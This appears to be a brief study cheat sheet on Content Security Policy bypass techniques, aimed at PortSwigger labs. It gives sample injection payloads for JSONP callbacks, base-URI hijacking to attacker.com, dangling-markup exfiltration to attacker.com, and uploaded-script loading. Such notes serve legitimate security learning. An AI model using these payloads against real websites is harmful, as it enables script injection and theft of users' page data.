# CSP Bypass - Attack Techniques

## Content Security Policy

### What CSP Does
```
# Server sends header:
Content-Security-Policy: script-src 'self' https://trusted.com

# Browser only loads scripts from allowed sources
# Prevents inline scripts, eval, etc.
```

### Bypass Techniques

#### 1. JSONP Endpoint
```
# If CSP allows a domain with JSONP:
# Inject: <script src="https://allowed.com/jsonp?callback=alert(1)"></script>
```

#### 2. Base URI Injection
```
# If CSP doesn't restrict base-uri:
# Inject: <base href="https://attacker.com">
# Then relative URLs resolve to attacker.com
```

#### 3. Script Gadgets
```
# If CSP allows 'unsafe-inline' or specific libraries:
# Use existing JS gadgets in the page
```

#### 4. Dangling Markup
```
# If CSP doesn't protect against data exfiltration via HTML:
# Inject: <img src="https://attacker.com/?data=
# Browser sends partial page content to attacker
```

#### 5. Path Confusion
```
# If CSP allows script-src 'self':
# Upload script to same origin (e.g., via file upload)
# <script src="/uploads/evil.js"></script>
```

## PortSwigger Lab Approach
1. Check CSP header
2. Identify allowed sources
3. Look for JSONP endpoints on allowed domains
4. Test base-uri injection
5. Test script gadget abuse
